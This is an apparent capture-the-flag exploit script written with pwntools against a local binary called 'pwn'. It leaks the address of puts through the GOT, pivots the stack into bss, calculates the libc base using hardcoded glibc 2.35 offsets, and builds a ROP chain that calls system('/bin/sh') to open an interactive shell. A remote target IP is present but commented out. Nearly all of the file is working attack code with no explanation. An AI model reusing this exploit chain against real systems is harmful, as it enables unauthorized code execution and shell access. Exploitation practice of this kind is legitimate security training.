from kk import *
context(arch='amd64', os='linux')
#p = remote('192.168.127.12', 10001)
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/home/kk/libc-database/libs/libc6_2.35-0ubuntu3.12_amd64/libc.so.6')
#GDB(p,'b *0x4011db')

bss = 0x404a80
pop_rdi = 0x4011ab

p.recvuntil(b"what's your name?")
#payload = b'a'*(0x400)
payload = b'a'*0xa00 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) 
payload += p64(elf.symbols['main'])
p.send(payload)

p.recvuntil(b"what can you do with 8 bytes?\n")
payload = b'a'*(0x40) + p64(bss-8)
p.send(payload)

puts = u64(p.recv(6).ljust(8, b'\x00'))
print(hex(puts))
libc_base = puts - libc.symbols['puts']
print(hex(libc_base))
bin_sh = libc_base+0x1d8678
system = libc_base+0x0000000000050d70

p.recvuntil(b"what's your name?")
#payload = b'a'*(0x400)
payload = b'a'*(2416)  + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(elf.symbols['main'])

p.send(payload)


p.send(b'a')

p.interactive()





















